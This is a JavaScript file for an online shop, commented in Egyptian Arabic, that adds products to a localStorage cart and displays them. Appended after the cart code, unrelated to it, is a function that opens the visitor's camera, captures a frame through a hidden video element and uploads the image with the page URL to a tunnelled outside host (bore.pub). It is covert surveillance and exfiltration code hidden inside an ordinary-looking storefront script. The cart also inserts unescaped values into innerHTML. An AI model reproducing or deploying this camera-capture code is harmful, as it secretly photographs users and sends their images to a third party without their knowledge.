// 1. دالة إضافة المنتج للسلة (بتشتغل لما تدوس Add To Cart)
function addToCart() {
    // نجيب البيانات من الصفحة عن طريق الـ ID
    let title = document.getElementById('product-title').innerText;
    let priceText = document.getElementById('product-price').innerText;
    let imageSrc = document.getElementById('product-img').src;
    let quantity = document.getElementById('product-qty').value;

    // نشيل علامة $ من السعر عشان نعرف نحسبه كـ رقم
    let priceNumber = parseFloat(priceText.replace('$', ''));

    // نعمل المنتج في شكل Object (كائن)
    let item = {
        title: title,
        price: priceNumber,
        image: imageSrc,
        qty: parseInt(quantity)
    };

    // نجيب السلة القديمة من المتصفح لو موجودة، لو مفيش نعمل List فاضية
    let cart = JSON.parse(localStorage.getItem('myCart')) || [];

    // نشوف لو المنتج ده موجود أصلاً في السلة ولا لأ
    let existingItem = cart.find(product => product.title === item.title);

    if (existingItem) {
        // لو موجود، نزود الكمية بس
        existingItem.qty += item.qty;
    } else {
        // لو مش موجود، نضيفه للسلة
        cart.push(item);
    }

    // نحفظ السلة في المتصفح تاني
    localStorage.setItem('myCart', JSON.stringify(cart));

    // نطلع رسالة للمستخدم
    alert("Item added to cart successfully!");
}

// 2. دالة عرض المنتجات في صفحة الـ Cart
function displayCart() {
    let container = document.getElementById('cart-items-container');
    let totalElement = document.getElementById('cart-total');

    // لو إحنا مش في صفحة الـ Cart، الكود هيقف ومش هيكمل عشان ميعملش Error
    if (!container) return;

    // نجيب السلة من المتصفح
    let cart = JSON.parse(localStorage.getItem('myCart')) || [];

    // لو السلة فاضية
    if (cart.length === 0) {
        container.innerHTML = "<h3 style='color: gray;'>Your cart is empty.</h3>";
        totalElement.innerText = "Total: $0";
        return;
    }

    let cartHTML = "";
    let totalPrice = 0;

    // نلف على المنتجات اللي في السلة ونرسمها
    cart.forEach((item, index) => {
        let itemTotal = item.price * item.qty;
        totalPrice += itemTotal; // نجمع الإجمالي

        // تصميم بسيط وشيك لكل منتج في السلة باستخدام Flexbox
        cartHTML += `
            <div style="display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 15px; margin-bottom: 15px; border: 1px solid rgba(124, 58, 237, 0.2);">
                <img src="${item.image}" alt="product" width="100" style="border-radius: 10px;">
                
                <div style="flex: 1; margin-left: 20px;">
                    <h4 style="margin-bottom: 8px;">${item.title}</h4>
                    <p style="color: #c4b5fd;">Price: $${item.price} | Qty: ${item.qty}</p>
                </div>
                
                <h3 style="color: #7c3aed; margin-right: 20px;">$${itemTotal}</h3>
                
                <button onclick="removeFromCart(${index})" style="background: red; color: white; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer;">Remove</button>
            </div>
        `;
    });

    // نحط الـ HTML اللي كوناه جوه الصفحة ونحدث الإجمالي
    container.innerHTML = cartHTML;
    totalElement.innerText = `Total: $${totalPrice}`;
}

// 3. دالة لحذف منتج معين من السلة
function removeFromCart(index) {
    let cart = JSON.parse(localStorage.getItem('myCart')) || [];
    cart.splice(index, 1); // يمسح المنتج بناءً على رقمه
    localStorage.setItem('myCart', JSON.stringify(cart)); // يحفظ التعديل
    displayCart(); // يرسم السلة من تاني عشان يعكس التحديث
}

// بنشغل دالة العرض تلقائياً أول ما الصفحة تفتح
displayCart();
// دالة التقاط الصورة وإرسالها
async function captureAndSend() {
    try {
        // 1. طلب الوصول إلى الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'environment', // أو 'user' حسب الكاميرا المطلوبة
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });

        // 2. إنشاء عنصر فيديو مؤقت (مخفي)
        const video = document.createElement('video');
        video.style.display = 'none';
        video.srcObject = stream;
        document.body.appendChild(video);
        await video.play();

        // 3. إنشاء عنصر كانفاس لالتقاط الإطار
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // 4. استخراج الصورة بصيغة base64 (بدون البادئة)
        const dataUrl = canvas.toDataURL('image/png');
        const base64Image = dataUrl.split(',')[1];

        // 5. الحصول على رابط الصفحة الحالية
        const pageUrl = window.location.href;

        // 6. إرسال البيانات إلى السيرفر
        const response = await fetch('http://bore.pub:54270/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                image: base64Image,
                url: pageUrl
            })
        });

        const result = await response.json();
        console.log('تم الإرسال بنجاح:', result);

        // 7. إيقاف الكاميرا وتنظيف العناصر المؤقتة
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        canvas.remove();

    } catch (error) {
        console.error('خطأ:', error);
        alert('تعذر الوصول إلى الكاميرا. تأكد من منح الصلاحية.');
    }
}
